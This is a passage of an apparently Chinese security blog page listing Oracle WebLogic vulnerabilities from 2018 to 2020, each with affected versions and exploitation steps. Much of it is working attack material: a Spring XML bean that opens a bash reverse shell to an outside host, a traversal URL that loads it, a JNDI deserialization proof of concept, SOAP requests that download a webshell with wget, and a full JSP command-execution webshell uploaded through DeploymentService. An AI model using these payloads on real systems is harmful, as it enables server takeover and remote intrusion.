xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;&lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;&lt;constructor-arg&gt;&lt;list&gt;&lt;value&gt;-c&lt;/value&gt;&lt;value&gt;/bin/bash&lt;/value&gt;&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1]]&gt;&lt;/value&gt;&lt;/list&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放在</p><pre class="line-numbers language-none"><code class="language-none">http://1.1.1.1/rce.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后进行反弹</p><pre class="line-numbers language-none"><code class="language-none">http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://1.1.1.1/rce.xml")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-2、CVE-2020-14841（weblogic-jndi注入）"><a href="#3-2-2、CVE-2020-14841（weblogic-jndi注入）" class="headerlink" title="3.2.2、CVE-2020-14841（weblogic jndi注入）"></a>3.2.2、CVE-2020-14841（weblogic jndi注入）</h3><h4 id="（1）、介绍-2"><a href="#（1）、介绍-2" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        参考文章</p><pre class="line-numbers language-none"><code class="language-none">https://www.77169.net/html/270571.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）、影响版本-2"><a href="#（2）、影响版本-2" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.012.2.1.4.014.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-2"><a href="#（3）、利用-2" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>POC</p><pre class="line-numbers language-none"><code class="language-none">// JdbcRowSetImpl       JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();       jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");       MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();       methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");       methodAttributeAccessor.setIsWriteOnly(true);       methodAttributeAccessor.setAttributeName("UnicodeSec");       LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");       final ExtractorComparator comparator = new ExtractorComparator(extractor);       final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);       Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};       Reflections.setFieldValue(queue, "queue", q);       Reflections.setFieldValue(queue, "size", 2);       Field comparatorF = queue.getClass().getDeclaredField("comparator");       comparatorF.setAccessible(true);       comparatorF.set(queue, new ExtractorComparator(extractor));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-3、-CVE-2020-14756（WebLogic-T3IIOP反序列化RCE）"><a href="#3-2-3、-CVE-2020-14756（WebLogic-T3IIOP反序列化RCE）" class="headerlink" title="3.2.3、 CVE-2020-14756（WebLogic T3IIOP反序列化RCE）"></a>3.2.3、 CVE-2020-14756（WebLogic T3IIOP反序列化RCE）</h3><h4 id="（1）、介绍-3"><a href="#（1）、介绍-3" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        无</p><h4 id="（2）、影响版本-3"><a href="#（2）、影响版本-3" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">未找到<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/Y4er/CVE-2020-14645<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）、利用-3"><a href="#（3）、利用-3" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><h3 id="3-2-4、CVE-2020-14645（WebLogic-UniversalExtractor反序列化漏洞）"><a href="#3-2-4、CVE-2020-14645（WebLogic-UniversalExtractor反序列化漏洞）" class="headerlink" title="3.2.4、CVE-2020-14645（WebLogic UniversalExtractor反序列化漏洞）"></a>3.2.4、CVE-2020-14645（WebLogic UniversalExtractor反序列化漏洞）</h3><h4 id="（1）、介绍-4"><a href="#（1）、介绍-4" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        攻击者可利用该漏洞实现远程代码执行。该反序列化的gadget存在与coherence包中。</p><h4 id="（2）、影响版本-4"><a href="#（2）、影响版本-4" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.2.1.4.012.2.1.3.012.1.3.0.014.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-4"><a href="#（3）、利用-4" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/Y4er/CVE-2020-14645<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-5、CVE-2020-14644-Weblogic-coherence组件iiop反序列化漏洞"><a href="#3-2-5、CVE-2020-14644-Weblogic-coherence组件iiop反序列化漏洞" class="headerlink" title="3.2.5、CVE-2020-14644 (Weblogic coherence组件iiop反序列化漏洞)"></a>3.2.5、CVE-2020-14644 (Weblogic coherence组件iiop反序列化漏洞)</h3><h4 id="（1）、介绍-5"><a href="#（1）、介绍-5" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>参考文章</p><pre class="line-numbers language-none"><code class="language-none">https://www.cnblogs.com/potatsoSec/p/13451993.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（2）、影响版本-5"><a href="#（2）、影响版本-5" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">12.2.1.3.012.1.3.0.014.1.1.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-5"><a href="#（3）、利用-5" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/potats0/cve_2020_14644<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-6、CVE-2020-2883（Weblogic-远程代码执行漏洞-）"><a href="#3-2-6、CVE-2020-2883（Weblogic-远程代码执行漏洞-）" class="headerlink" title="3.2.6、CVE-2020-2883（Weblogic 远程代码执行漏洞 ）"></a>3.2.6、CVE-2020-2883（Weblogic 远程代码执行漏洞 ）</h3><h4 id="（1）、介绍-6"><a href="#（1）、介绍-6" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        Weblogic 默认开启 T3 协议，攻击者可利用T3协议进行反序列化漏洞实现远程代码执行。</p><h4 id="（2）、影响版本-6"><a href="#（2）、影响版本-6" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.012.2.1.4.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-6"><a href="#（3）、利用-6" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-2883_cmd.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-7、CVE-2020-2551（Weblogic-IIOP协议反序列化rce-）"><a href="#3-2-7、CVE-2020-2551（Weblogic-IIOP协议反序列化rce-）" class="headerlink" title="3.2.7、CVE-2020-2551（Weblogic  IIOP协议反序列化rce ）"></a>3.2.7、CVE-2020-2551（Weblogic  IIOP协议反序列化rce ）</h3><h4 id="（1）、介绍-7"><a href="#（1）、介绍-7" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        漏洞依然是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，在使用之前未经安全检查，导致恶意代码被执行。</p><h4 id="（2）、影响版本-7"><a href="#（2）、影响版本-7" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.012.2.1.4.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-7"><a href="#（3）、利用-7" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/Y4er/CVE-2020-2551<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3、2019"><a href="#3-3、2019" class="headerlink" title="3.3、2019"></a>3.3、2019</h2><pre class="line-numbers language-none"><code class="language-none">Weblogic反序列化漏洞 CVE-2019-2890Weblogic反序列化远程代码执行漏洞CVE-2019-2725Weblogic反序列化漏洞 CVE-2019-2729Weblogic任意文件读取漏洞（CVE-2019-2615)）Weblogic 文件上传漏洞（CVE-2019-2618）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-1、CVE-2019-2890（Weblogic反序列化漏洞-）"><a href="#3-3-1、CVE-2019-2890（Weblogic反序列化漏洞-）" class="headerlink" title="3.3.1、CVE-2019-2890（Weblogic反序列化漏洞 ）"></a>3.3.1、CVE-2019-2890（Weblogic反序列化漏洞 ）</h3><h4 id="（1）、介绍-8"><a href="#（1）、介绍-8" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        Weblogic在利用T3协议进行远程资源加载调用时，默认会进行黑名单过滤以保证反序列化安全。漏洞CVE-2019-2890绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。与CVE-2019-2725类似。</p><h4 id="（2）、影响版本-8"><a href="#（2）、影响版本-8" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-8"><a href="#（3）、利用-8" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/SukaraLin/CVE-2019-2890<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断是否存在漏洞，如下图所示则可能存在漏洞</p><pre class="line-numbers language-none"><code class="language-none">http://ip:7001/_async/AsyncResponseService<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//CVE-2019-2729-1.png" alt="CVE-2019-2729-1"></p><p>开个web服务</p><p>放一个shell.jsp</p><p>通过以下请求包，上传到服务器</p><pre class="line-numbers language-none"><code class="language-none">POST /_async/AsyncResponseService HTTP/1.1Host: you ip:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Connection: closeContent-Length: 858content-type: text/xml &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件地址</p><pre class="line-numbers language-none"><code class="language-none">http://ip:7001/_async/shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-2、CVE-2019-2729（Weblogic反序列化漏洞-）"><a href="#3-3-2、CVE-2019-2729（Weblogic反序列化漏洞-）" class="headerlink" title="3.3.2、CVE-2019-2729（Weblogic反序列化漏洞 ）"></a>3.3.2、CVE-2019-2729（Weblogic反序列化漏洞 ）</h3><h4 id="（1）、介绍-9"><a href="#（1）、介绍-9" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        是对CVE-2019-2725打的补丁被绕过了，使用标签<array method="forName">替换<class>标签。</class></array></p><h4 id="（2）、影响版本-9"><a href="#（2）、影响版本-9" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.3.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-9"><a href="#（3）、利用-9" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>exp</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/ruthlezs/CVE-2019-2729-Exploitpython CVE-2019-2729.py -u 地址 -c whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3、CVE-2019-2725-Weblogic反序列化远程代码执行漏洞"><a href="#3-3-3、CVE-2019-2725-Weblogic反序列化远程代码执行漏洞" class="headerlink" title="3.3.3、CVE-2019-2725(Weblogic反序列化远程代码执行漏洞)"></a>3.3.3、CVE-2019-2725(Weblogic反序列化远程代码执行漏洞)</h3><h4 id="（1）、介绍-10"><a href="#（1）、介绍-10" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。与CVE-2019-2618类似。</p><h4 id="（2）、影响版本-10"><a href="#（2）、影响版本-10" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.*12.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（3）、利用-10"><a href="#（3）、利用-10" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>漏洞存在的页面：</p><pre class="line-numbers language-none"><code class="language-none">/_async/AsyncResponseService<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>能访问就可能存在漏洞</p><p> <img src="https://img.ex1t.xyz//CVE-2020-14882-1.png" alt="CVE-2020-14882-1"></p><p>开个web服务放shell.txt，上传到服务器</p><pre class="line-numbers language-none"><code class="language-none">POST /_async/AsyncResponseService HTTP/1.1Host: IP:PORTUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Length: 859Accept-Encoding: gzip, deflateSOAPAction:Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;wget http://ip:端口/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>位置</p><pre class="line-numbers language-none"><code class="language-none">ip:7001/bea_wls_deployment_internal/shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-4、CVE-2019-2618（Weblogic-文件上传漏洞）"><a href="#3-3-4、CVE-2019-2618（Weblogic-文件上传漏洞）" class="headerlink" title="3.3.4、CVE-2019-2618（Weblogic 文件上传漏洞）"></a>3.3.4、CVE-2019-2618（Weblogic 文件上传漏洞）</h3><h4 id="（1）、介绍-11"><a href="#（1）、介绍-11" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。攻击者突破了OAM（Oracle Access Management）认证，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。</p><h4 id="（2）、影响版本-11"><a href="#（2）、影响版本-11" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-11"><a href="#（3）、利用-11" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p><strong>前提是要有账号密码</strong></p><p>上传成功后会返回文件地址</p><p>POST包</p><pre class="line-numbers language-none"><code class="language-none">POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1Host: ip:7001Connection: closeAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.21.0username: weblogicwl_request_type: app_uploadcache-control: no-cachewl_upload_application_name: ../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/warserverName: weblogicpassword: 12345.comcontent-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gWarchive: trueserver_version: 10.3.6.0wl_upload_delta: trueContent-Length: 1083 ------WebKitFormBoundary7MA4YWxkTrZu0gWContent-Disposition: form-data; name="shell.jsp"; filename="shell.jsp"Content-Type: false  &lt;%@ page import="java.util.*,java.io.*"%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;Commands with JSP&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;&lt;INPUT TYPE="text" NAME="cmd"&gt;&lt;INPUT TYPE="submit" VALUE="Send"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter("cmd") != null) {    out.println("Command: " + request.getParameter("cmd") + "&lt;BR&gt;");    Process p;    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));    }    else{        p = Runtime.getRuntime().exec(request.getParameter("cmd"));    }    OutputStream os = p.getOutputStream();    InputStream in = p.getInputStream();    DataInputStream dis = new DataInputStream(in);    String disr = dis.readLine();    while ( disr != null ) {    out.println(disr);    disr = dis.readLine();    }}%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;  ------WebKitFormBoundary7MA4YWxkTrZu0gW--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>地址</p><pre class="line-numbers language-none"><code class="language-none">ip:7001/bea_wls_deployment_internal/shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-3-5、CVE-2019-2615（Weblogic任意文件读取漏洞"><a href="#3-3-5、CVE-2019-2615（Weblogic任意文件读取漏洞" class="headerlink" title="3.3.5、CVE-2019-2615（Weblogic任意文件读取漏洞)"></a>3.3.5、CVE-2019-2615（Weblogic任意文件读取漏洞)</h3><h4 id="（1）、介绍-12"><a href="#（1）、介绍-12" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        利用该漏洞，攻击者可以在已知用户名密码的情况下读取WebLogic服务器中的任意文件。</p><h4 id="（2）、影响版本-12"><a href="#（2）、影响版本-12" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-12"><a href="#（3）、利用-12" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p> <img src="https://img.ex1t.xyz//CVE-2019-2615-1.png" alt="CVE-2019-2615-1"></p><h2 id="2-4、2018年"><a href="#2-4、2018年" class="headerlink" title="2.4、2018年"></a>2.4、2018年</h2><pre class="line-numbers language-none"><code class="language-none">weblogic 反序列化漏洞 CVE-2018-3252Weblogic反序列化远程代码执行漏洞 CVE-2018-3245Weblogic远程代码执行漏洞 CVE-2018-3191Weblogic任意文件上传漏洞（CVE-2018-2894）Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-1、CVE-2018-3252（weblogic-反序列化漏洞）"><a href="#2-4-1、CVE-2018-3252（weblogic-反序列化漏洞）" class="headerlink" title="2.4.1、CVE-2018-3252（weblogic 反序列化漏洞）"></a>2.4.1、CVE-2018-3252（weblogic 反序列化漏洞）</h3><h4 id="（1）、介绍-13"><a href="#（1）、介绍-13" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        weblogic DeploymentService组件的反序列化漏洞。</p><h4 id="（2）、影响版本-13"><a href="#（2）、影响版本-13" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">未找到<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（3）、利用-13"><a href="#（3）、利用-13" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>POC</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/pyn3rd/CVE-2018-3252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞-）"><a href="#2-4-2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞-）" class="headerlink" title="2.4.2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞 ）"></a>2.4.2、CVE-2018-3245（Weblogic反序列化远程代码执行漏洞 ）</h3><h4 id="（1）、介绍-14"><a href="#（1）、介绍-14" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        该漏洞通过 JRMP 协议利用 RMI 机制的缺陷达到执行任意反序列化代码的目的。攻击者可以在未授权的情况下将 payload 封装在 T3 协议中，通过对 T3 协议中的 payload 进行反序列化，从而实现对存在漏洞的 WebLogic 组件进行远程攻击，执行任意代码并可获取目标系统的所有权限。</p><h4 id="（2）、影响版本-14"><a href="#（2）、影响版本-14" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-14"><a href="#（3）、利用-14" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>POC</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/pyn3rd/CVE-2018-3245<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-3、CVE-2018-3191（Weblogic远程代码执行漏洞-）"><a href="#2-4-3、CVE-2018-3191（Weblogic远程代码执行漏洞-）" class="headerlink" title="2.4.3、CVE-2018-3191（Weblogic远程代码执行漏洞 ）"></a>2.4.3、CVE-2018-3191（Weblogic远程代码执行漏洞 ）</h3><h4 id="（1）、介绍-15"><a href="#（1）、介绍-15" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p><h4 id="（2）、影响版本-15"><a href="#（2）、影响版本-15" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.012.2.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-15"><a href="#（3）、利用-15" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>POC</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/pyn3rd/CVE-2018-3191<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-4、CVE-2018-2894（Weblogic任意文件上传漏洞）"><a href="#2-4-4、CVE-2018-2894（Weblogic任意文件上传漏洞）" class="headerlink" title="2.4.4、CVE-2018-2894（Weblogic任意文件上传漏洞）"></a>2.4.4、CVE-2018-2894（Weblogic任意文件上传漏洞）</h3><h4 id="（1）、介绍-16"><a href="#（1）、介绍-16" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。</p><h4 id="（2）、影响版本-16"><a href="#（2）、影响版本-16" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.212.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-16"><a href="#（3）、利用-16" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>首先要能够登录后台</p><p>/console访问后台登陆后</p><p>base_domain的高级配置中</p><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-1.png" alt="CVE-2018-2894-1"></p><p>启用web服务测试页，记得在最下面保存。。。</p><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-2.png" alt="CVE-2018-2894-2"></p><p>再访问</p><pre class="line-numbers language-none"><code class="language-none">http://XXX:7001/ws_utc/config.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-3.png" alt="CVE-2018-2894-3"></p><p>设置当前工作目录为</p><pre class="line-numbers language-none"><code class="language-none">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个是ws_utc应用的静态文件css目录，访问这个是不需要权限的</p><p>然后安全添加jsp</p><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-4.png" alt="CVE-2018-2894-4"></p><p>通过审查元素查看时间戳</p><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-5.png" alt="CVE-2018-2894-5"></p><p>/ws_utc/css/config/keystore/[时间戳]_[文件名]</p><p>成功访问</p><pre class="line-numbers language-none"><code class="language-none">/ws_utc/css/config/keystore/1627709344373_ce.jsp<span aria-hidden="true" 